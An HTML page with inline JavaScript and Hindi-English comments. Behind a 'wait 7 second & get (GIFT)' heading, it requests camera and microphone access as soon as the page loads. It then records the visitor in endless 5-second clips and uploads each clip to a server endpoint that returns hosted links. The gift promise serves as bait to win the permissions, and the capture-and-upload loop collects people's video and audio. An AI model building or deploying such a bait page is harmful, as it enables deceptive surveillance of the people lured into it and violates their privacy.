<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto 5-Second Cloudinary Recorder</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        body {
            background: linear-gradient(135deg, #1f4068, #162447);
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        .container {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            padding: 30px;
            border-radius: 16px;
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
            text-align: center;
            max-width: 600px;
            width: 90%;
        }
        h2 {
            margin-bottom: 20px;
            font-weight: 500;
            color: #e4e4e4;
        }
        video {
            width: 100%;
            max-height: 280px;
            border-radius: 12px;
            background: #000;
            object-fit: cover;
            border: 2px solid rgba(255, 255, 255, 0.2);
            transform: scaleX(-1); /* Mirror view */
        }
        #status {
            margin-top: 15px;
            font-size: 14px;
            color: #f1c40f;
            word-break: break-all;
        }
        #linksContainer {
            margin-top: 15px;
            max-height: 100px;
            overflow-y: auto;
            text-align: left;
            font-size: 13px;
            background: rgba(0, 0, 0, 0.2);
            padding: 10px;
            border-radius: 8px;
        }
        a {
            color: #3498db;
            text-decoration: none;
            display: block;
            margin-bottom: 5px;
        }
        a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>wait 7 second & get (GIFT)</h2>
        <!-- autoplay, muted, aur playsinline mobile ke liye zaroori hain -->
        <video id="preview" autoplay muted playsinline></video>
        
        <p id="status">Permissions mangi ja rahi hain...</p>
        <div id="linksContainer"></div>
    </div>

    <script>
        let mediaRecorder;
        let stream;
        let recordedChunks = [];

        const preview = document.getElementById('preview');
        const status = document.getElementById('status');
        const linksContainer = document.getElementById('linksContainer');

        async function initMedia() {
            try {
                status.innerText = "Kripya Camera aur Microphone ki permission dein...";
                
                // Explicitly front camera aur audio maangna
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' }, 
                    audio: true 
                });
                
                preview.srcObject = stream;
                
                // Video play hone ka ensure karna
                await preview.play().catch(e => console.log("Preview play error:", e));
                
                status.innerText = "🔴 Recording chalu hai... Har 5 second mein server par save ho raha hai.";

                startRecordingCycle();

            } catch (err) {
                console.error("Permission error:", err);
                status.innerText = "Error: Camera ya Mic ki permission nahi mili.";
            }
        }

        function startRecordingCycle() {
            let options = { mimeType: 'video/webm' };
            if (!MediaRecorder.isTypeSupported('video/webm')) {
                options = { mimeType: 'video/mp4' };
            }

            recordedChunks = [];
            mediaRecorder = new MediaRecorder(stream, options);

            mediaRecorder.ondataavailable = (event) => {
                if (event.data && event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };

            mediaRecorder.onstop = async () => {
                if (recordedChunks.length > 0) {
                    const completeBlob = new Blob(recordedChunks, { type: mediaRecorder.mimeType });
                    await uploadToServer(completeBlob);
                }
                startRecordingCycle();
            };

            mediaRecorder.start();

            setTimeout(() => {
                if (mediaRecorder && mediaRecorder.state === "recording") {
                    mediaRecorder.stop();
                }
            }, 5000);
        }

        async function uploadToServer(blob) {
            const formData = new FormData();
            formData.append("file", blob, "recording.webm");

            try {
                const response = await fetch('/upload', {
                    method: "POST",
                    body: formData
                });
                
                const data = await response.json();
                if (data.secure_url) {
                    const timeStr = new Date().toLocaleTimeString();
                    const link = document.createElement('a');
                    link.href = data.secure_url;
                    link.target = "_blank";
                    link.innerText = `[${timeStr}] Saved! Click to view`;
                    linksContainer.prepend(link);
                } else {
                    console.error("Upload Error:", data);
                }
            } catch (err) {
                console.error("Network error:", err);
            }
        }

        window.addEventListener('load', initMedia);
    </script>
</body>
</html>
